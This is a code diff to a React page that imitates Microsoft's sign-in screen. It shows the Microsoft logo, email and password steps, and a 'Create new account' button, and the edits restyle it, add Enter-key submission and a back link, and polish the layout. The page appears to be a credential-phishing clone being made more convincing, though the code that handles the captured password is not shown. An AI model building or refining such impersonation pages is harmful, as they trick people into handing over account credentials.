@@ -47,6 +47,7 @@ export default function MicrosoftLoginPage() {
   const handleBack = () => {
     setStep(1);
     setFeedback('');
+    setPassword('');
   };
 
   return (
@@ -58,53 +59,167 @@ export default function MicrosoftLoginPage() {
       </Head>
 
       <style jsx>{`
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: linear-gradient(135deg, #e7ebf0, #f0f2f5); height: 100vh; margin: 0; display: flex; align-items: center; justify-content: center; }
-        .login-container { background: white; width: 360px; padding: 20px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); text-align: center; }
-        .logo { width: 50px; height: 50px; margin: 0 auto 20px; }
-        input { width: 95%; padding: 12px; margin: 10px 0; border: 1px solid #ccd0d5; border-radius: 6px; background: #f5f6f7; font-size: 16px; }
-        input:focus { outline: none; border-color: #0078d4; }
-        button { width: 100%; padding: 12px; margin: 15px 0; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 16px; cursor: pointer; }
-        button:hover { background: #005a9e; }
-        .feedback { color: red; font-size: 14px; margin: 8px 0; }
-        a { color: #0078d4; text-decoration: none; font-size: 14px; display: block; margin-top: 10px; }
-        .success-overlay { position: fixed; inset: 0; background: rgba(255,255,255,0.98); display: none; align-items: center; justify-content: center; z-index: 9999; }
-        .success-overlay.show { display: flex; }
-        .success-box { text-align: center; padding: 20px; }
-        .checkmark { width: 110px; height: 110px; background: #4caf50; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 28px; box-shadow: 0 4px 12px rgba(76,175,80,0.4); }
-        .checkmark svg { width: 56px; height: 56px; }
-        .create-account { background: linear-gradient(135deg, #42b72a, #36a420); color: white; border: 2px solid #0078d4; border-radius: 6px; padding: 12px; margin-top: 15px; margin-bottom: 10px; cursor: pointer; font-size: 16px; width: 100%; }
-        .create-account:hover { background: linear-gradient(135deg, #36a420, #2e921c); }
-        @media (max-width: 480px) { .login-container { width: 90%; padding: 24px; } }
+        html, body { height: 100%; margin: 0; padding: 0; }
+        body { 
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
+          background: linear-gradient(135deg, #e7ebf0, #f0f2f5); 
+          display: flex; 
+          align-items: center; 
+          justify-content: center; 
+          min-height: 100vh;
+        }
+        .login-container {
+          background: white; 
+          width: 360px; 
+          padding: 20px; 
+          border-radius: 8px; 
+          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+          text-align: center;
+          max-width: 90vw;
+        }
+        .logo { 
+          width: 50px; 
+          height: 50px; 
+          margin: 0 auto 20px; 
+          display: block;
+        }
+        input { 
+          width: 100%; 
+          max-width: 320px;
+          padding: 12px 16px; 
+          margin: 10px auto 0;
+          display: block;
+          border: 1px solid #ccd0d5; 
+          border-radius: 6px; 
+          font-size: 15px; 
+          background: #f5f6f7;
+        }
+        input:focus { 
+          outline: none; 
+          border-color: #0078d4; 
+          background: white;
+        }
+        button { 
+          width: 100%; 
+          max-width: 320px;
+          padding: 12px; 
+          background: #0078d4; 
+          color: white; 
+          border: none; 
+          border-radius: 6px; 
+          font-size: 16px; 
+          cursor: pointer;
+          margin-top: 8px;
+          display: block;
+        }
+        button:hover { 
+          background: #005a9e; 
+        }
+        .feedback { 
+          color: #e1306c; 
+          font-size: 14px; 
+          margin: 8px auto 0;
+          max-width: 320px;
+          display: block;
+        }
+        a {
+          color: #0078d4;
+          text-decoration: none;
+          font-size: 14px;
+          display: block;
+          margin-top: 10px;
+        }
+        .secondary-btn {
+          background: linear-gradient(135deg, #42b72a, #36a420);
+          color: white;
+          border: 2px solid #0078d4;
+          border-radius: 6px;
+          padding: 12px;
+          margin-top: 15px;
+          margin-bottom: 10px;
+          cursor: pointer;
+          width: 100%;
+          max-width: 320px;
+          display: block;
+          margin-left: auto;
+          margin-right: auto;
+          font-size: 16px;
+        }
+        .secondary-btn:hover { 
+          background: linear-gradient(135deg, #36a420, #2e921c); 
+        }
+        .back-link {
+          color: #0078d4;
+          text-decoration: none;
+          font-size: 14px;
+          display: block;
+          margin-top: 12px;
+          cursor: pointer;
+        }
+        .back-link:hover { text-decoration: underline; }
+        .success-overlay { 
+          position: fixed; 
+          inset: 0; 
+          background: rgba(255,255,255,0.98); 
+          display: none; 
+          align-items: center; 
+          justify-content: center; 
+          z-index: 9999; 
+        }
+        .success-overlay.show { 
+          display: flex; 
+        }
+        .success-box { 
+          text-align: center; 
+          padding: 20px; 
+        }
+        .checkmark { 
+          width: 110px; 
+          height: 110px; 
+          background: #4caf50; 
+          border-radius: 50%; 
+          display: flex; 
+          align-items: center; 
+          justify-content: center; 
+          margin: 0 auto 28px; 
+          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
+        }
+        .checkmark svg { 
+          width: 56px; 
+          height: 56px; 
+        }
       `}</style>
 
       <div className="login-container">
-        <img className="logo" src="/logos/mlogo.svg" alt="Microsoft" />
-        <h2>Sign in</h2>
-        
-        {step === 1 && (
+        {step === 1 ? (
           <div>
+            <img className="logo" src="/logos/mlogo.svg" alt="Microsoft" />
+            <h2>Sign in</h2>
             <input 
               type="email" 
               placeholder="Email address" 
               value={email}
               onChange={(e) => setEmail(e.target.value)}
+              onKeyDown={(e) => e.key === 'Enter' && handleNext()}
             />
+            <div className="feedback">{feedback}</div>
             <button onClick={handleNext}>Next</button>
           </div>
-        )}
-        
-        {step === 2 && (
+        ) : (
           <div>
+            <h2>Enter your password</h2>
             <input
               type="password"
               placeholder="Password"
               value={password}
               onChange={(e) => setPassword(e.target.value)}
+              onKeyDown={(e) => e.key === 'Enter' && handleLogin()}
             />
             <div className="feedback">{feedback}</div>
             <button onClick={handleLogin}>Sign in</button>
             <a href="#">Forgot your password?</a>
-            <button className="create-account" onClick={() => alert('Create new account')}>Create new account</button>
+            <button className="secondary-btn" onClick={() => alert('Create new account')}>Create new account</button>
+            <div className="back-link" onClick={handleBack}>← Back</div>
           </div>
         )}
       </div>
